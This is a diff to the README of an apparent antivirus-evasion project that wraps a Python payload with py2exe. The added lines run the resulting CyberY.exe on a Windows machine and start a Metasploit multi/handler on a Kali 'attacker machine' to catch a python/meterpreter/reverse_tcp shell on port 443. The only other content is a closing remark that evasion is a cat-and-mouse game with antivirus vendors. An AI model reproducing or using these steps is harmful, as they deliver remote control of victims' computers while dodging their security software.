@@ -50,7 +50,18 @@ The script will generate CyberY.py, build, and dist, Our execution file will be 
 ![Output](https://github.com/0xCyberY/Antivirus-Evasion-Py2exe/blob/main/output.png)
 
 In case there is an error such as The system cannot open the device or file specified.
-**Try hard!**
+**Try hard!!**
+### Run the CyberY.exe
+```
+C:\>.\dist\CyberY.exe
+```
+### On attacker machine (Kali)
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD python/meterpreter/reverse_tcp; set LPORT 443; set LHOST 192.168.1.10"
+
+msf6 exploit(multi/handler) > exploit
+```
 # Conclusion
 Keep in mind that attempting antivirus bypass is a game. Whenever a new evasion technique gets popular, antivirus vendors will eventually learn about itand update their signatures database to block it. Then, new evasion techniques will a rise, which will make vendors to add it to their signature database, and so on.
 
